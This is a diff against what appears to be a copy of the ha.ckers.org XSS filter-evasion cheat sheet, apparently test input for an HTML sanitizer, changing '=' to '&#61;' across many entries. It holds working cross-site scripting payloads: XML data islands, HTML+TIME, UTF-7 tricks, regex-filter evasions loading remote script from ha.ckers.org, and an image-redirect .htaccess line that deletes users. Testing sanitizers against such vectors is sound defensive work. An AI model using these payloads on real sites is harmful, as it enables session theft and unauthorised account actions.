       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -766,16 +766,16 @@ implementation="http://ha.ckers.org/xss.htc"> <NeatHtmlReplace_xss:xss>XSS</Neat
 and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult 
 while auditing Yahoo:
       <NeatHtmlReplace_XML ID=I><NeatHtmlReplace_X><NeatHtmlReplace_C>&lt;IMG 
-SRC=&quot;javascript:alert('XSS');&quot;&gt; </NeatHtmlReplace_C></NeatHtmlReplace_X></NeatHtmlReplace_xml><SPAN DATASRC=#I 
-DATAFLD=C DATAFORMATAS=HTML></SPAN>
+SRC&#61;&quot;javascript:alert('XSS');&quot;&gt; </NeatHtmlReplace_C></NeatHtmlReplace_X></NeatHtmlReplace_xml><SPAN DATASRC&#61;#I 
+DATAFLD&#61;C DATAFORMATAS&#61;HTML></SPAN>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       XML data island with comment obfuscation (this is another take on the 
 same exploit that doesn't use CDATA fields, but rather uses comments to break 
 up the javascript directive):
-      <NeatHtmlReplace_XML ID="xss"><I><B>&lt;IMG SRC="javascript:alert('XSS')"&gt;</B></I></NeatHtmlReplace_XML> <SPAN DATASRC="#xss" DATAFLD="B" 
-DATAFORMATAS="HTML"></SPAN>
+      <NeatHtmlReplace_XML ID="xss"><I><B>&lt;IMG SRC&#61;"javascript:alert('XSS')"&gt;</B></I></NeatHtmlReplace_XML> <SPAN DATASRC&#61;"#xss" DATAFLD&#61;"B" 
+DATAFORMATAS&#61;"HTML"></SPAN>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -783,25 +783,25 @@ DATAFORMATAS="HTML"></SPAN>
 XML data island. This is the same as above but instead referrs to a locally 
 hosted (must be on the same server) XML file that contains your cross site 
 scripting vector. You can see the result here:
-      <NeatHtmlReplace_XML SRC="xsstest.xml" ID=I></NeatHtmlReplace_XML> <SPAN DATASRC=#I DATAFLD=C 
-DATAFORMATAS=HTML></SPAN>
+      <NeatHtmlReplace_XML SRC&#61;"xsstest.xml" ID=I></NeatHtmlReplace_XML> <SPAN DATASRC&#61;#I DATAFLD&#61;C 
+DATAFORMATAS&#61;HTML></SPAN>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       HTML+TIME in XML. This is how Grey Magic hacked Hotmail and Yahoo!. This 
 only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode 
 and remember that you need to be between HTML and BODY tags for this to work:
-      <NeatHtmlReplace_HTML><NeatHtmlReplace_BODY> <?NeatHtmlReplace_xml:namespace prefix="t" 
-ns="urn:schemas-microsoft-com:time"> <?NeatHtmlReplace_import namespace="t" 
-implementation="#default#time2"> <NeatHtmlReplace_t:set attributeName="innerHTML" 
-to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"> 
+      <NeatHtmlReplace_HTML><NeatHtmlReplace_BODY> <?NeatHtmlReplace_xml:namespace prefix&#61;"t" 
+ns&#61;"urn:schemas-microsoft-com:time"> <?NeatHtmlReplace_import namespace&#61;"t" 
+implementation&#61;"#default#time2"> <NeatHtmlReplace_t:set attributeName&#61;"innerHTML" 
+to&#61;"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"> 
 </NeatHtmlReplace_BODY></NeatHtmlReplace_HTML>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Assuming you can only fit in a few characters and it filters against 
 ".js" you can rename your JavaScript file to an image as an XSS vector:
-      <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+      <SCRIPT SRC&#61;"http://ha.ckers.org/xss.jpg"></SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -826,7 +826,7 @@ delete users, add users (if the user who visits the page is an administrator),
 send credentials elsewhere, etc.... This is one of the lesser used but more 
 useful XSS vectors:
       <NeatHtmlReplace_IMG 
-SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"
+SRC&#61;"http://www.thesiteyouareon.com/somecommand.php?somevariables&#61;maliciouscode"
 >
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
@@ -835,7 +835,7 @@ SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"
 absolutely no identifiers that make it look suspicious other than it is not 
 hosted on your own domain. The vector uses a 302 or 304 (others work too) to 
 redirect the image back to a command. So a normal <NeatHtmlReplace_IMG 
-SRC="http://badguy.com/a.jpg"> could actually be an attack vector to run 
+SRC&#61;"http://badguy.com/a.jpg"> could actually be an attack vector to run 
 commands as the user who views the image link. Here is the .htaccess (under 
 Apache) line to accomplish the vector (thanks to Timo for part of this):
       Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
@@ -850,8 +850,8 @@ visits the page. With these two scenarios combined you can modify the victim's
 cookie which will be displayed back to them as JavaScript (you can also use 
 this to log people out or change their user states, get them to log in as you, 
 etc...):
-      <NeatHtmlReplace_META HTTP-EQUIV="Set-Cookie" 
-Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
+      <NeatHtmlReplace_META HTTP-EQUIV&#61;"Set-Cookie" 
+Content&#61;"USERID&#61;&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -863,8 +863,8 @@ set to auto-detect and there is no overriding content-types on the page in
 Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not 
 work in any modern browser without changing the encoding type which is why it 
 is marked as completely unsupported. Watchfire found this hole in Google's 
-custom 404 script.: <NeatHtmlReplace_HEAD><NeatHtmlReplace_META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; 
-charset=UTF-7"> </NeatHtmlReplace_HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+custom 404 script.: <NeatHtmlReplace_HEAD><NeatHtmlReplace_META HTTP-EQUIV&#61;"CONTENT-TYPE" CONTENT&#61;"text/html; 
+charset&#61;UTF-7"> </NeatHtmlReplace_HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -875,52 +875,52 @@ XSS using HTML quote encapsulation:
       This was tested in IE, your mileage may vary. For performing XSS on sites 
 that allow "<SCRIPT>" but don't allow "<SCRIPT SRC..." by way of a regex filter 
 "/<NeatHtmlReplace_script[^>]+src/i":
-      <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+      <SCRIPT a&#61;">" SRC&#61;"http://ha.ckers.org/xss.js"></SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       For performing XSS on sites that allow "<SCRIPT>" but don't allow 
 "<script src..." by way of a regex filter 
-"/<NeatHtmlReplace_script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i" (this 
+"/<NeatHtmlReplace_script((\s+\w+(\s*&#61;\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i" (this 
 is an important one, because I've seen this regex in the wild):
-      <SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+      <SCRIPT &#61;">" SRC&#61;"http://ha.ckers.org/xss.js"></SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Another XSS to evade the same filter, 
-"/<NeatHtmlReplace_script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i":
-      <SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+"/<NeatHtmlReplace_script((\s+\w+(\s*&#61;\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i":
+      <SCRIPT a&#61;">" '' SRC&#61;"http://ha.ckers.org/xss.js"></SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Yet another XSS to evade the same filter, 
-"/<NeatHtmlReplace_script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i". I 
+"/<NeatHtmlReplace_script((\s+\w+(\s*&#61;\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i". I 
 know I said I wasn't goint to discuss mitigation techniques but the only thing 
 I've seen work for this XSS example if you still want to allow <SCRIPT> tags 
 but not remote script is a state machine (and of course there are other ways to 
 get around this if they allow <SCRIPT> tags):
-      <SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+      <SCRIPT "a&#61;'>'" SRC&#61;"http://ha.ckers.org/xss.js"></SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       And one last XSS attack to evade, 
-"/<NeatHtmlReplace_script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i" using 
+"/<NeatHtmlReplace_script((\s+\w+(\s*&#61;\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i" using 
 grave accents (again, doesn't work in Firefox):
-      <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+      <SCRIPT a&#61;`>` SRC&#61;"http://ha.ckers.org/xss.js"></SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Here's an XSS example that bets on the fact that the regex won't catch a 
 matching pair of quotes but will rather find any quotes to terminate a 
 parameter string improperly:
-      <SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+      <SCRIPT a&#61;">'>" SRC&#61;"http://ha.ckers.org/xss.js"></SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       This XSS still worries me, as it would be nearly impossible to stop this 
 without blocking all active content:
       <SCRIPT>document.write("<NeatHtmlReplace_SCRI");</SCRIPT>PT 
-SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+SRC&#61;"http://ha.ckers.org/xss.js"></SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -1018,7 +1018,7 @@ this set up properly):
 
 
       JavaScript link location:
-      <A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+      <A HREF="javascript:document.location&#61;'http://www.google.com/'">XSS</A>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
